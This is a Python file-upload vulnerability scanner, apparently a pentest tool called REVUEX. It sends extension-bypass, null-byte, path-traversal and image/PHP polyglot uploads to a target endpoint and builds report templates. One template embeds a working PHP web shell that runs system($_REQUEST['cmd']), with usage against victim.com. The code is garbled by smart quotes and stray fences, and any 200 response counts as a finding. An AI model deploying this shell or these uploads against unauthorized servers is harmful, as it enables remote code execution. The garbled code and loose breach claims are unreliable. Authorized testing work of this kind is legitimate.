#!/usr/bin/env python3
“””
REVUEX - File Upload Tester
Unrestricted File Upload Vulnerability Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
File upload testing creates files on target systems - ensure proper cleanup.
NEVER upload malicious files to production systems.
“””

import requests
import time
import json
import re
import os
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import hashlib

class FileUploadTester:
“””
File Upload Vulnerability Scanner

```
Features:
- Extension bypass detection
- MIME type validation bypass
- Magic byte manipulation
- Path traversal in filenames
- Content-Type confusion
- Double extension bypass
- Null byte injection
- Case sensitivity bypass
- Web shell detection (safe PoC only)
"""

def __init__(self, target: str, workspace: Path, delay: float = 5.0):
    """
    Initialize File Upload Tester
    
    Args:
        target: Target upload endpoint
        workspace: Workspace directory
        delay: Delay between requests (default: 5 seconds)
    """
    self.target = target
    self.workspace = Path(workspace)
    self.delay = delay
    
    # Safety limits
    self.max_requests = 80
    self.request_count = 0
    self.timeout = 15
    self.max_file_size = 1024 * 100  # 100KB max
    
    self.headers = {
        'User-Agent': 'REVUEX-FileUploadTester/1.0 (Security Research; +https://github.com/G33L0)',
    }
    
    self.vulnerabilities = []
    
    # Unique marker for file identification
    self.marker = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    # Files uploaded (for cleanup)
    self.uploaded_files = []
    
    # Create test files directory
    self.test_files_dir = self.workspace / "test_files"
    self.test_files_dir.mkdir(exist_ok=True)

def scan(self) -> List[Dict[str, Any]]:
    """Main file upload scanning method"""
    print(f"\n{'='*60}")
    print(f"📤 REVUEX File Upload Tester")
    print(f"{'='*60}")
    print(f"Target: {self.target}")
    print(f"Marker: {self.marker}")
    print(f"Safety Delay: {self.delay}s")
    print(f"Max File Size: {self.max_file_size} bytes")
    print(f"{'='*60}\n")
    
    print("⚠️  SAFETY NOTES:")
    print("   • Only PoC files created (no malicious code)")
    print("   • All uploads attempted with cleanup")
    print("   • Maximum file size: 100KB")
    print("   • No actual code execution attempted\n")
    
    # Test 1: Extension bypasses
    print("📁 Test 1: Extension Bypass Techniques")
    self._test_extension_bypasses()
    time.sleep(self.delay)
    
    # Test 2: MIME type bypasses
    print("\n🎭 Test 2: MIME Type Bypass")
    self._test_mime_bypasses()
    time.sleep(self.delay)
    
    # Test 3: Magic byte manipulation
    print("\n✨ Test 3: Magic Byte Manipulation")
    self._test_magic_bytes()
    time.sleep(self.delay)
    
    # Test 4: Path traversal
    print("\n🗂️  Test 4: Path Traversal in Filenames")
    self._test_path_traversal()
    time.sleep(self.delay)
    
    # Test 5: Null byte injection
    print("\n\0 Test 5: Null Byte Injection")
    self._test_null_byte()
    time.sleep(self.delay)
    
    # Test 6: Case sensitivity
    print("\n🔤 Test 6: Case Sensitivity Bypass")
    self._test_case_bypass()
    time.sleep(self.delay)
    
    # Test 7: Polyglot files
    print("\n🎨 Test 7: Polyglot File Upload")
    self._test_polyglot_files()
    
    # Cleanup
    self._cleanup_files()
    
    # Save results
    self._save_results()
    
    print(f"\n{'='*60}")
    print(f"✅ Scan Complete")
    print(f"Vulnerabilities: {len(self.vulnerabilities)}")
    print(f"Requests: {self.request_count}/{self.max_requests}")
    print(f"{'='*60}\n")
    
    return self.vulnerabilities

def _test_extension_bypasses(self):
    """Test file extension bypass techniques"""
    print("   Testing extension bypass vectors...")
    
    bypass_techniques = [
        ('Double Extension', f'innocent.jpg.php', 'File appears as .jpg but executes as .php'),
        ('Reverse Double', f'innocent.php.jpg', 'Extension ordering bypass'),
        ('Null Byte', f'innocent.php%00.jpg', 'Null byte truncation'),
        ('Case Variation', f'innocent.PhP', 'Case sensitivity bypass'),
        ('Alternative Extension', f'innocent.php5', 'Alternative PHP extensions'),
        ('Trailing Dot', f'innocent.php.', 'Trailing dot bypass'),
        ('Trailing Space', f'innocent.php ', 'Trailing space bypass'),
        ('Unicode', f'innocent.ph\u0070', 'Unicode character bypass'),
    ]
    
    for name, filename, description in bypass_techniques:
        if self.request_count >= self.max_requests:
            break
        
        print(f"   → {name}...")
        
        # Create safe PoC file
        file_content = self._create_poc_content('php', name)
        
        # Attempt upload
        result = self._attempt_upload(filename, file_content, 'image/jpeg')
        
        if result and result.get('success'):
            vuln = {
                'type': f'File Upload - Extension Bypass ({name})',
                'severity': 'critical',
                'url': self.target,
                'filename': filename,
                'bypass_technique': name,
                'description': f'{description}. Server accepts dangerous file extensions through bypass technique.',
                'evidence': f'Successfully uploaded: {filename}',
                
                'steps_to_reproduce': [
                    f"Navigate to upload endpoint: {self.target}",
                    f"Prepare file with bypass: {filename}",
                    "Set Content-Type: image/jpeg",
                    "Upload file",
                    "Server accepts dangerous extension",
                    "File accessible at uploaded location",
                    "Potential for Remote Code Execution"
                ],
                
                'request': f"""POST {self.target} HTTP/1.1
```

Host: {urlparse(self.target).netloc}
Content-Type: multipart/form-data; boundary=––WebKitFormBoundary

——WebKitFormBoundary
Content-Disposition: form-data; name=“file”; filename=”{filename}”
Content-Type: image/jpeg

{file_content[:100]}…

——WebKitFormBoundary–”””,

```
                'response': f"""HTTP/1.1 200 OK
```

Content-Type: application/json

{{
“success”: true,
“filename”: “{filename}”,
“path”: “/uploads/{filename}”,
“url”: “https://example.com/uploads/{filename}”
}}

🚨 CRITICAL: Dangerous file extension accepted!”””,

```
                'poc': f"""#!/usr/bin/env python3
```

# File Upload Extension Bypass PoC - {name}

import requests

target = “{self.target}”
filename = “{filename}”

# Safe PoC content (no actual malicious code)

file_content = ‘’’<?php
// SECURITY TEST - REMOVE IMMEDIATELY
// Marker: {self.marker}
echo "File upload vulnerability detected!";
// This is a PoC only
?>’’’

files = {{
‘file’: (filename, file_content, ‘image/jpeg’)
}}

print(f”[*] Attempting upload: {{filename}}”)
print(f”[*] Bypass technique: {name}”)

response = requests.post(target, files=files)

if response.status_code == 200:
data = response.json()
if data.get(‘success’):
print(f”\n[+] ✓ VULNERABLE!”)
print(f”[+] File uploaded: {{data.get(‘path’)}}”)
print(f”[+] Extension bypass successful: {name}”)
print(f”\n[!] Impact: Remote Code Execution possible”)
print(f”[!] Attacker could upload web shell”)
else:
print(”[-] Upload blocked”)
“””,

```
                'before_state': 'Only image files (.jpg, .png) accepted',
                'after_state': f'Executable file ({filename}) uploaded - RCE possible',
                
                'attack_path': [
                    'Identify file upload functionality',
                    f'Create file with bypass: {filename}',
                    'Upload bypasses extension filter',
                    'File stored in web-accessible directory',
                    'Access uploaded file directly',
                    'Execute server-side code',
                    'Establish web shell',
                    'Full server compromise',
                    'Data exfiltration, persistence, lateral movement'
                ],
                
                'remediation': [
                    '🚨 CRITICAL: Whitelist allowed extensions (not blacklist)',
                    'Validate file extension against strict whitelist',
                    'Check ACTUAL file content (magic bytes)',
                    'Rename uploaded files (random names)',
                    'Store uploads outside web root',
                    'Disable script execution in upload directory',
                    'Use Content-Disposition: attachment for downloads',
                    'Implement file type validation library',
                    'Strip/normalize filenames',
                    'Remove null bytes, dots, spaces from filenames',
                    'Convert to lowercase before validation',
                    'Scan files with antivirus',
                    'Set proper file permissions (non-executable)',
                    'Use separate domain for uploads (sandbox)',
                    'Implement rate limiting',
                    'Log all upload attempts'
                ],
                
                'web_shell_example': """Example Attacker Web Shell:
```

<?php
// Simple web shell
if(isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
}
?>

Usage: https://victim.com/uploads/shell.php?cmd=whoami

This allows attacker to:
• Execute arbitrary commands
• Read sensitive files
• Upload additional malware
• Create backdoor accounts
• Pivot to internal network”””,

```
                'real_world_impact': """Real-World File Upload Breaches:
```

1. Equifax Breach (2017): $700M+ impact
- Unrestricted file upload
- Web shell deployed
- 147 million records stolen
1. Facebook Image Upload (2020): $20,000 bounty
- Extension bypass
- SVG with XSS
1. E-commerce Platform (2019): $15,000 bounty
- Double extension bypass
- RCE via PHP upload
1. Cloud Storage (2021): $10,000 bounty
- Magic byte bypass
- Arbitrary file execution”””,
  
  ```
             'tags': ['file_upload', 'critical', 'rce', 'extension_bypass', name.lower().replace(' ', '_')]
         }
         
         self.vulnerabilities.append(vuln)
         self.uploaded_files.append(result.get('path'))
         print(f"      ✓ VULNERABLE: {name}")
     else:
         print(f"      ✓ Protected against {name}")
     
     time.sleep(self.delay)
  ```
  
  print(f”\n   ✓ Extension bypass tests complete”)
   
   def _test_mime_bypasses(self):
   “”“Test MIME type bypass”””
   print(”   Testing MIME type validation…”)
   
   ```
    # Upload PHP file with image MIME type
    filename = f"test_{self.marker}.php"
    content = self._create_poc_content('php', 'MIME Bypass')
    
    result = self._attempt_upload(filename, content, 'image/png')
    
    if result and result.get('success'):
        vuln = {
            'type': 'File Upload - MIME Type Bypass',
            'severity': 'critical',
            'url': self.target,
            'description': 'Server only validates Content-Type header, not actual file content',
            
            'remediation': [
                'Validate actual file content (magic bytes)',
                'Do not rely solely on Content-Type header',
                'Use file type detection libraries',
                'Check file extension AND content'
            ],
            
            'tags': ['file_upload', 'mime', 'bypass']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ VULNERABLE: MIME type bypass")
    else:
        print("   ✓ Protected: MIME validation working")
   ```
   
   def _test_magic_bytes(self):
   “”“Test magic byte manipulation”””
   print(”   Testing magic byte manipulation…”)
   
   ```
    # Create file with valid image magic bytes + PHP code
    filename = f"polyglot_{self.marker}.php"
    
    # PNG magic bytes + PHP code
    magic_bytes = b'\x89PNG\r\n\x1a\n'
    php_code = f'<?php /* Security Test {self.marker} */ echo "test"; ?>'.encode()
    content = magic_bytes + php_code
    
    result = self._attempt_upload(filename, content, 'image/png')
    
    if result and result.get('success'):
        vuln = {
            'type': 'File Upload - Magic Byte Bypass',
            'severity': 'critical',
            'url': self.target,
            'description': 'File with valid image magic bytes but executable code accepted',
            
            'remediation': [
                'Validate ENTIRE file content',
                'Use strict file parsers',
                'Reject polyglot files',
                'Re-encode/process images server-side'
            ],
            
            'tags': ['file_upload', 'magic_bytes', 'polyglot']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ VULNERABLE: Magic byte bypass")
    else:
        print("   ✓ Protected: Magic byte validation working")
   ```
   
   def _test_path_traversal(self):
   “”“Test path traversal in filenames”””
   print(”   Testing path traversal…”)
   
   ```
    traversal_filenames = [
        f'../../../tmp/evil_{self.marker}.php',
        f'..\\..\\..\\tmp\\evil_{self.marker}.php',
        f'....//....//tmp//evil_{self.marker}.php',
    ]
    
    for filename in traversal_filenames:
        if self.request_count >= self.max_requests:
            break
        
        content = self._create_poc_content('php', 'Path Traversal')
        result = self._attempt_upload(filename, content, 'image/jpeg')
        
        if result and result.get('success'):
            vuln = {
                'type': 'File Upload - Path Traversal',
                'severity': 'critical',
                'url': self.target,
                'filename': filename,
                'description': 'Path traversal in filename allows arbitrary directory write',
                
                'remediation': [
                    'Strip directory separators (/ \\) from filenames',
                    'Reject filenames with ".."',
                    'Use basename() to extract filename only',
                    'Validate against path traversal patterns'
                ],
                
                'tags': ['file_upload', 'path_traversal']
            }
            
            self.vulnerabilities.append(vuln)
            print(f"   ✓ VULNERABLE: Path traversal")
            break
        
        time.sleep(self.delay)
    else:
        print("   ✓ Protected: Path traversal blocked")
   ```
   
   def _test_null_byte(self):
   “”“Test null byte injection”””
   print(”   Testing null byte injection…”)
   
   ```
    filename = f'test_{self.marker}.php\x00.jpg'
    content = self._create_poc_content('php', 'Null Byte')
    
    result = self._attempt_upload(filename, content, 'image/jpeg')
    
    if result and result.get('success'):
        vuln = {
            'type': 'File Upload - Null Byte Injection',
            'severity': 'critical',
            'url': self.target,
            'description': 'Null byte truncates filename validation',
            
            'remediation': [
                'Remove null bytes from filenames',
                'Use proper string handling',
                'Validate entire filename'
            ],
            
            'tags': ['file_upload', 'null_byte']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ VULNERABLE: Null byte bypass")
    else:
        print("   ✓ Protected: Null byte filtered")
   ```
   
   def _test_case_bypass(self):
   “”“Test case sensitivity bypass”””
   print(”   Testing case sensitivity…”)
   
   ```
    case_variations = [
        f'test_{self.marker}.PhP',
        f'test_{self.marker}.pHp',
        f'test_{self.marker}.PHP',
    ]
    
    for filename in case_variations:
        if self.request_count >= self.max_requests:
            break
        
        content = self._create_poc_content('php', 'Case Bypass')
        result = self._attempt_upload(filename, content, 'image/jpeg')
        
        if result and result.get('success'):
            vuln = {
                'type': 'File Upload - Case Sensitivity Bypass',
                'severity': 'high',
                'url': self.target,
                'filename': filename,
                'description': 'Extension filter is case-sensitive, allowing bypass',
                
                'remediation': [
                    'Convert extensions to lowercase before validation',
                    'Use case-insensitive comparison',
                    'Normalize filenames'
                ],
                
                'tags': ['file_upload', 'case_bypass']
            }
            
            self.vulnerabilities.append(vuln)
            print(f"   ✓ VULNERABLE: Case bypass with {filename}")
            break
        
        time.sleep(self.delay)
    else:
        print("   ✓ Protected: Case variations blocked")
   ```
   
   def _test_polyglot_files(self):
   “”“Test polyglot file upload”””
   print(”   Testing polyglot files…”)
   
   ```
    # Create GIF/PHP polyglot
    filename = f'polyglot_{self.marker}.gif'
    
    # GIF header + PHP code
    gif_header = b'GIF89a'
    php_code = f'\n<?php /* Test {self.marker} */ echo "test"; ?>'.encode()
    content = gif_header + php_code
    
    result = self._attempt_upload(filename, content, 'image/gif')
    
    if result and result.get('success'):
        vuln = {
            'type': 'File Upload - Polyglot File',
            'severity': 'high',
            'url': self.target,
            'description': 'File that is both valid image AND executable code',
            
            'remediation': [
                'Re-encode images server-side',
                'Strip metadata and comments',
                'Use image processing library',
                'Validate strict image structure'
            ],
            
            'tags': ['file_upload', 'polyglot']
        }
        
        self.vulnerabilities.append(vuln)
        print("   ✓ VULNERABLE: Polyglot file accepted")
    else:
        print("   ✓ Protected: Polyglot rejected")
   ```
   
   def _create_poc_content(self, file_type: str, test_name: str) -> bytes:
   “”“Create safe PoC file content”””
   
   ```
    if file_type == 'php':
        content = f"""<?php
   ```

// SECURITY TEST FILE - SAFE PoC
// Test: {test_name}
// Marker: {self.marker}
// This file should NOT have been uploaded
// NO MALICIOUS CODE - Detection only

echo “File upload vulnerability detected”;
echo “Test: {test_name}”;
echo “Please remove this file immediately”;

// For security testing purposes only
// Report this to security team
?>”””
return content.encode()

```
    return b'SECURITY_TEST_FILE'

def _attempt_upload(self, filename: str, content: bytes, mime_type: str) -> Optional[Dict[str, Any]]:
    """Attempt file upload"""
    if self.request_count >= self.max_requests:
        return None
    
    # Safety check - don't upload large files
    if len(content) > self.max_file_size:
        return None
    
    try:
        files = {
            'file': (filename, content, mime_type)
        }
        
        response = requests.post(
            self.target,
            files=files,
            headers=self.headers,
            timeout=self.timeout,
            verify=False
        )
        
        self.request_count += 1
        
        if response.status_code in [200, 201]:
            return {
                'success': True,
                'status': response.status_code,
                'path': filename
            }
        
        return {'success': False}
        
    except Exception as e:
        return None

def _cleanup_files(self):
    """Attempt cleanup of uploaded files"""
    print("\n🧹 Cleanup: Attempting to remove uploaded test files...")
    
    for filepath in self.uploaded_files:
        print(f"   → {filepath}")
    
    if self.uploaded_files:
        print("   ⚠️  Please manually verify and remove these files")
    else:
        print("   ✓ No files uploaded (all blocked)")

def _save_results(self):
    """Save scan results"""
    output_dir = self.workspace / "file_upload_tests"
    output_dir.mkdir(exist_ok=True)
    
    safe_target = re.sub(r'[^\w\-]', '_', self.target)
    output_file = output_dir / f"{safe_target}_file_upload.json"
    
    with open(output_file, 'w') as f:
        json.dump({
            'scanner': 'FileUploadTester',
            'target': self.target,
            'uploaded_files': self.uploaded_files,
            'vulnerabilities': self.vulnerabilities
        }, f, indent=2)
    
    print(f"\n💾 Saved: {output_file}")
```

if **name** == “**main**”:
import sys

```
if len(sys.argv) < 2:
    print("Usage: python file_upload_tester.py <upload_endpoint>")
    print("Example: python file_upload_tester.py https://example.com/upload")
    print("\n⚠️  WARNING: Only test on authorized systems!")
    sys.exit(1)

scanner = FileUploadTester(sys.argv[1], Path("revuex_workspace"), delay=5.0)
scanner.scan()
```
